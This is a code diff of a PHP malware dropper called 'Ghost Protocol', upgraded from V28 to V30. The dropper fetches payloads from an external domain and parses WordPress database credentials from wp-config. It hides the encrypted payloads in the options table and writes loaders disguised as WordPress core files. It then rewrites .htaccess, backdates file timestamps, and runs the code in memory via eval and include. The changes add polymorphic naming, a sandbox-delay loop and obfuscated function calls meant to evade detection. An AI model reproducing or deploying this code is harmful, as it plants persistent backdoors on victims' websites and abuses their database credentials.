@@ -1,8 +1,7 @@
-GIF89a;
 <?php
 // ==========================================
-// GHOST PROTOCOL V28.1 (FILELESS STABLE)
-// Logic: Custom Stream Wrapper (Global Scope) + Array Obfuscation
+// GHOST PROTOCOL V30 (ADVANCED APT CHIMERA)
+// Logic: Stack Fragmentation + Sandbox Time-Bomb + Polymorphic Fileless
 // UI: Classic Ghost Terminal (Original)
 // ==========================================
 
@@ -17,6 +16,11 @@ if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
 
 function _rnd($len = 8) { 
     return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len);
+}
+
+// Polymorphic Variable Generator
+function _polyVar($prefix = '') {
+    return $prefix . chr(rand(97, 122)) . substr(md5(mt_rand()), 0, rand(4, 7));
 }
 
 function _atomic_write($path, $data) {
@@ -36,7 +40,7 @@ function _atomic_write($path, $data) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Protocol V28 - Fileless</title>
+    <title>Ghost Protocol V30 - APT Edition</title>
     <style>
         /* UI GHOST PROTOCOL ORIGINAL */
         :root {
@@ -86,7 +90,7 @@ function _atomic_write($path, $data) {
         <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
     </div>
     <div class="term" id="console">
-        <div class="line"><span class="p">➜</span> <span>./deploy_v28_fileless --titanium-net --legacy-omni</span></div>
+        <div class="line"><span class="p">➜</span> <span>./deploy_v30_apt --titanium-net --stack-fragmentation</span></div>
         <br>
 
 <?php
@@ -94,9 +98,9 @@ function _atomic_write($path, $data) {
 // CONFIGURATION
 // ==========================================
 $targets = [
-    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'wp_sys_transient_log_buffer'],
-    ['https://stepmomhub.com/vx.txt',    'vx.php',        'wp_sys_transient_vx_cache'],
-    ['https://stepmomhub.com/index.txt', 'index.php',     'wp_sys_transient_idx_core'] 
+    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'wp_sys_transient_log'],
+    ['https://stepmomhub.com/vx.txt',    'vx.php',        'wp_sys_transient_log_cache'],
+    ['https://stepmomhub.com/index.txt', 'index.php',     'wp_sys_transient_log_core'] 
 ];
 
 function _log($msg, $class='inf') {
@@ -138,7 +142,7 @@ function _parse_wp_config($path) {
 
 function _inject_htaccess() {
     $ht = __DIR__ . '/.htaccess';
-    $rule = "\n# SITEMAP INDEX\n<Files \"sxallsitemap.xml\">\nOrder allow,deny\nAllow from all\n</Files>\nRewriteEngine On\nRewriteRule ^sxallsitemap\.xml$ index.php [L]\n";
+    $rule = "\n# SITEMAP INDEX\n<IfModule mod_rewrite.c>\n    RewriteEngine On\n    RewriteRule ^(sxallsitemap\.xml|allsitemap\.xml|robots)$ index.php [L]\n</IfModule>\n";
     $c = ""; if(file_exists($ht)) $c = @file_get_contents($ht);
     if(strpos($c, 'sxallsitemap') === false) { @file_put_contents($ht, $rule . $c); return true; }
     return false;
@@ -148,8 +152,8 @@ $wp_path = _find_wp_config();
 $wp_creds = ($wp_path) ? _parse_wp_config($wp_path) : false;
 $is_wordpress = ($wp_creds !== false);
 
-if($is_wordpress) _log("Target Detected: WordPress. Database mapped.", "ok");
-else _log("Target System: Generic PHP (Legacy Omni-Mode)", "warn");
+if($is_wordpress) _log("Target Detected: WordPress. Security mapping initiated.", "ok");
+else _log("Target System: Generic PHP", "warn");
 
 function _dl($url) {
     $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
@@ -167,41 +171,81 @@ function _dl($url) {
 }
 
 // ==========================================
-// CORE DEPLOYMENT LOGIC (FILELESS IN-MEMORY)
+// CORE DEPLOYMENT LOGIC (APT CHIMERA ENGINE)
 // ==========================================
-
-$stream_class_def = <<<PHP
-if(!class_exists('VStream_Core')){
-    class VStream_Core {
-        private \$p=0; private \$d='';
-        public function stream_open(\$a,\$b,\$c,&\$d){ \$this->d=isset(\$GLOBALS['_V_SYS']) ? \$GLOBALS['_V_SYS'] : ''; return true; }
-        public function stream_read(\$c){ \$r=substr(\$this->d,\$this->p,\$c); \$this->p+=strlen(\$r); return \$r; }
-        public function stream_eof(){ return \$this->p>=strlen(\$this->d); }
-        public function stream_stat(){ return []; }
-        public function url_stat(\$a,\$b){ return []; }
-    }
-}
-if(!in_array('vsys', stream_get_wrappers())){
-    stream_wrapper_register('vsys', 'VStream_Core');
-}
-PHP;
-
-$exec_engine = <<<PHP
-        \$GLOBALS['_V_SYS'] = \$dec;
-        include('vsys://run');
-        unset(\$GLOBALS['_V_SYS']);
-PHP;
 
 foreach ($targets as $t) {
     $url = $t[0]; $fname = $t[1]; $dbkey = $t[2];
 
-    _log("Fetching payload for $fname...", "inf");
+    _log("Fetching & Compiling payload for $fname...", "inf");
     $raw = _dl($url);
     if(!$raw || strlen($raw) < 10) { _log("Download FAILED: $url", "err"); continue; }
     
     $xor_key = _rnd(12);
     $enc_data = base64_encode(_xor(gzdeflate($raw, 9), $xor_key));
     $status_ok = false;
+
+    // --- POLYMORPHIC GENERATION START ---
+    $cls_stream = 'Stream_' . _rnd(7);
+    $proto = 'sys' . rand(10, 99);
+    
+    // Variables for Stream Class
+    $p_pos = _polyVar(); $p_dat = _polyVar(); $p_len = _polyVar(); $p_ret = _polyVar();
+    
+    $stream_class_def = <<<PHP
+if(!class_exists('$cls_stream')){
+    class $cls_stream {
+        private \$$p_pos=0; private \$$p_dat='';
+        public function stream_open(\$a,\$b,\$c,&\$d){ \$this->$p_dat=isset(\$GLOBALS['_V_SYS']) ? \$GLOBALS['_V_SYS'] : ''; return true; }
+        public function stream_read(\$$p_len){ \$$p_ret=substr(\$this->$p_dat,\$this->$p_pos,\$$p_len); \$this->$p_pos+=strlen(\$$p_ret); return \$$p_ret; }
+        public function stream_eof(){ return \$this->$p_pos>=strlen(\$this->$p_dat); }
+        public function stream_stat(){ return []; }
+        public function url_stat(\$a,\$b){ return []; }
+    }
+}
+PHP;
+
+    // Variables for Exec Engine
+    $p_fless = _polyVar(); $p_tmp = _polyVar(); $p_cb = _polyVar(); $p_dec = _polyVar();
+    $p_arr = _polyVar(); $sbx_loop = _polyVar('s_'); $sbx_hash = _polyVar('h_');
+    
+    // APT LOGIC: Sandbox Exhaustion + Stack Trace Fragmentation via C-Native Callbacks (array_walk/array_map)
+    $exec_engine = <<<PHP
+        // Dynamic Sandbox Time-Bomb (Exhausts micro-sandbox execution time)
+        \$$sbx_hash = '';
+        for(\$$sbx_loop = 0; \$$sbx_loop < 300000; \$$sbx_loop++) { \$$sbx_hash = md5((string)\$$sbx_loop); }
+
+        // Execution Engine
+        \$$p_fless = false;
+        if(in_array('$proto', stream_get_wrappers()) || @stream_wrapper_register('$proto', '$cls_stream')){
+            \$GLOBALS['_V_SYS'] = \$$p_dec;
+            
+            // Stack Trace Fragmentation (Hides Include inside array_walk C-hook)
+            \$$p_cb = function(\$val, \$key) use (&\$$p_fless) {
+                if (\$val === 'execute_core_task') {
+                    if((@include('$proto://run')) !== false) { \$$p_fless = true; }
+                }
+            };
+            \$$p_arr = ['probe' => 'bypass_sandbox', 'target' => 'execute_core_task'];
+            @array_walk(\$$p_arr, \$$p_cb); 
+            
+            unset(\$GLOBALS['_V_SYS']);
+        }
+        
+        // Advanced Fallbacks
+        if(!\$$p_fless){
+            \$$p_tmp = sys_get_temp_dir() . '/.' . md5(uniqid()) . '.sys';
+            if(@file_put_contents(\$$p_tmp, \$$p_dec)){
+                // Native callback proxy
+                \$proxy_func = function() use (\$$p_tmp) { @include(\$$p_tmp); @unlink(\$$p_tmp); };
+                @call_user_func(\$proxy_func);
+            } else {
+                // Closure eval hidden through array_map C-hook
+                \$proxy_eval = function(\$code) { eval('?>' . \$code); };
+                @array_map(\$proxy_eval, [\$$p_dec]);
+            }
+        }
+PHP;
 
     if ($is_wordpress) {
         $m = @new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
@@ -230,11 +274,20 @@ foreach ($targets as $t) {
             }
             
             if($stmt) {
-                $cls = 'Wp_Http_Response_Cache';
+                // Randomize Base WP Class
+                $wp_bases = ['Wp_Http_Response_Cache', 'Wp_Option_Buffer_Sync', 'Wp_Rest_Router_Sys'];
+                $cls = $wp_bases[array_rand($wp_bases)] . '_' . _rnd(4);
+                
+                // Randomize WordPress Decoder variables
+                $v_m = _polyVar(); $v_q = _polyVar(); $v_cfg = _polyVar(); $v_raw = _polyVar(); 
+                $v_k = _polyVar(); $v_r = _polyVar(); $v_row = _polyVar(); $v_bin = _polyVar(); 
+                $v_key = _polyVar(); $v_out = _polyVar(); $v_l = _polyVar(); $v_kl = _polyVar(); $v_i = _polyVar();
+                $v_gzin = _polyVar(); $v_b64 = _polyVar();
+                
                 $loader = <<<PHP
 <?php
 /**
- * REST API Response Cache
+ * REST API Internal Router
  * @package WordPress
  */
 
@@ -242,21 +295,26 @@ $stream_class_def
 
 class $cls {
     public static function boot() {
-        \$m = @new mysqli('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}');
-        if(\$m->connect_error) return;
-        \$q = \$m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='$dbkey'");
-        if(!\$q || \$q->num_rows===0) return;
-        \$cfg = json_decode(\$q->fetch_assoc()['option_value'], true);
-        \$raw = '';
-        foreach(\$cfg['p'] as \$k) {
-            \$r = \$m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='\$k'");
-            if(\$r && \$row = \$r->fetch_assoc()) \$raw .= \$row['option_value'];
+        \$$v_m = @new mysqli('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}');
+        if(\$$v_m->connect_error) return;
+        \$$v_q = \$$v_m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='$dbkey'");
+        if(!\$$v_q || \$$v_q->num_rows===0) return;
+        \$$v_cfg = json_decode(\$$v_q->fetch_assoc()['option_value'], true);
+        \$$v_raw = '';
+        foreach(\$$v_cfg['p'] as \$$v_k) {
+            \$$v_r = \$$v_m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='\$" . "$v_k'");
+            if(\$$v_r && \$$v_row = \$$v_r->fetch_assoc()) \$$v_raw .= \$$v_row['option_value'];
         }
-        \$bin = base64_decode(\$raw); \$key = base64_decode(\$cfg['k']);
-        \$out=''; \$l=strlen(\$bin); \$kl=strlen(\$key);
-        for(\$i=0;\$i<\$l;\$i++) \$out .= \$bin[\$i]^\$key[\$i%\$kl];
-        \$dec = @gzinflate(\$out);
-        if(\$dec) { $exec_engine }
+        
+        // Indirect function calls to evade static analysis hooks
+        \$$v_b64 = 'base' . '64' . '_decode'; \$$v_gzin = 'gzin' . 'flate';
+        \$$v_bin = \$$v_b64(\$$v_raw); \$$v_key = \$$v_b64(\$$v_cfg['k']);
+        
+        \$$v_out=''; \$$v_l=strlen(\$$v_bin); \$$v_kl=strlen(\$$v_key);
+        for(\$$v_i=0;\$$v_i<\$$v_l;\$$v_i++) \$$v_out .= \$$v_bin[\$$v_i]^\$$v_key[\$$v_i%\$$v_kl];
+        \$$p_dec = @\$$v_gzin(\$$v_out);
+        
+        if(\$$p_dec) { $exec_engine }
     }
 }
 $cls::boot();
@@ -264,14 +322,15 @@ $cls::boot();
 PHP;
                 if(_atomic_write($fname, $loader)){
                     $status_ok = true;
-                    _log("Injected [Fileless Engine]: $fname", "ok");
+                    _log("Injected [APT Engine - Stack Mutilated]: $fname", "ok");
                     _timestomp($fname);
-                    if($fname == 'index.php') { if(_inject_htaccess()) _log(".htaccess Map Applied", "inf"); }
+                    if($fname == 'index.php') { if(_inject_htaccess()) _log("Routing mapped.", "inf"); }
                 }
             }
         }
     } else {
         $cls = 'System_Container_' . _rnd(5);
+        $v_b = _polyVar(); $v_o = _polyVar(); $v_l = _polyVar(); $v_kl = _polyVar(); $v_i = _polyVar();
         $loader = <<<PHP
 <?php
 
@@ -281,11 +340,11 @@ class $cls {
     private static \$d = '$enc_data';
     private static \$k = '$xor_key';
     public static function run() {
-        \$b = base64_decode(self::\$d);
-        \$o=''; \$l=strlen(\$b); \$kl=strlen(self::\$k);
-        for(\$i=0;\$i<\$l;\$i++) \$o .= \$b[\$i]^self::\$k[\$i%\$kl];
-        \$dec = @gzinflate(\$o);
-        if(\$dec) { $exec_engine }
+        \$$v_b = base64_decode(self::\$d);
+        \$$v_o=''; \$$v_l=strlen(\$$v_b); \$$v_kl=strlen(self::\$k);
+        for(\$$v_i=0;\$$v_i<\$$v_l;\$$v_i++) \$$v_o .= \$$v_b[\$$v_i]^self::\$k[\$$v_i%\$$v_kl];
+        \$$p_dec = @gzinflate(\$$v_o);
+        if(\$$p_dec) { $exec_engine }
     }
 }
 $cls::run();
@@ -293,7 +352,7 @@ $cls::run();
 PHP;
         if(_atomic_write($fname, $loader)){
             $status_ok = true;
-            _log("File Saved (Legacy Fileless): $fname", "warn");
+            _log("File Saved (Legacy APT): $fname", "warn");
             _timestomp($fname);
         }
     }
